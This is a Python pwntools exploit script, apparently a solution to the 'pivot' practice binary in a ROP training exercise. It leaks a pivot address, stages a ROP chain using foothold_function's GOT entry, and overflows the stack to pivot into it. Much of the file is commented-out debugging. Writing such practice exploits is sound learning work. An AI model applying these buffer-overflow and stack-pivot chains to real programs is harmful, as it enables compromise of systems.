#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./pivot
# from pwn import *

# pyright: reportGeneralTypeIssues=false
# pyright: reportMissingImports=false
# pyright: reportUndefinedVariable=false
from logging import info
from pwn import p64
from pwn import process 
# from pwn import util 
from pwn import raw_input
from pwn import log
from pwn import u64 
from pwn import gdb
from pwn import context
from pwn import ELF 
from pwn import ROP 
from pwn import args
from pwntools_r2 import *
import sys

# from pwnlib.util.proc import wait_for_debugger
import binascii
# from pwnlib import util

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./pivot')
# context.terminal = ['tmux', 'splitw', '-h']
# context.terminal = ['tmux', 'splitw', '-v']
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# context.log_level = 'debug'
context(log_level='debug')
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

# beginning of pwnme func
# b *0x004008f9

# after asking for stack smash
# b *0x00400985

# call pwnme function
# b *0x004008c7

# call before pwnme
# 0x004008c4

# address before '>' stack smash
#0x40097b
r2script = '''
#r2.cmd('aaa')
#r2.cmd('db 0x00400720')
#r2.cmd('Vpp')
'''.format(**locals())

# def start(argv=[], *a, **kw):
#     '''Start the exploit against the target.'''
#     if args.GDB:
#         return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
#         # return gdb.attach(exe.path, gdbscript=gdbscript)
#     else:
#         return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'.'

# io = start()

io = r2dbg(exe.path,r2script)

# ret2win_offset = p64(0x00000a81)
# ret2win_offset = 0x00000a81
# foothold_offset = p64(0x0000096a)
# foothold_offset = 0x0000096a
add_offset = p64(0x00000a81 - 0x0000096a) 
# add_offset = p64(0x117)
foothold_plt = p64(0x00400720)
foothold_got = p64(0x0060103f)

pop_rax = p64(0x004009bb)
xchg_rax_rsp = p64(0x004009bd)
mov_rax_rax = p64(0x004009c0) # mov rax, qword [rax]; ret
add_rax_rbp = p64(0x004009c4) # add rax, rbp; ret
pop_rbp = p64(0x004007c8)
call_rax = p64(0x004006b0)

pop_rdi = p64(0x00400a33)
puts_plt = p64(0x004006e0)
puts_got = p64(0x0060101f)
main = p64(0x00400847)

io.recvuntil("pivot: 0x")
raw_pivot_addr = io.recvline().strip().rjust(16,b"0")
pivot_addr = u64(binascii.unhexlify(raw_pivot_addr), endian='little') 
# log.info(b'raw_pivot_addr at %a' % raw_pivot_addr)


stack_pivot = foothold_plt
stack_pivot += pop_rax
stack_pivot += foothold_got
stack_pivot += mov_rax_rax
stack_pivot += pop_rbp
stack_pivot += add_offset 
stack_pivot += add_rax_rbp
stack_pivot += call_rax

io.recvuntil("> ")


# log.info(b"stack_pivot: %a" % stack_pivot)
log.info("sending heap data for the stack pivot")
io.sendline(stack_pivot)
# p.recvrepeat(0.2)
io.recvuntil("> ")

log.info("sending buffer overflow then stack pivoting")

# stack overflow, return to stack pivot
offset = 40
padding = b"A" * offset
stack_chain = padding
stack_chain += pop_rax
stack_chain += p64( pivot_addr ) 
stack_chain += xchg_rax_rsp

# log.info(b"stack_chain: %a" % stack_chain)
io.interactive()
io.sendline(stack_chain)
# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

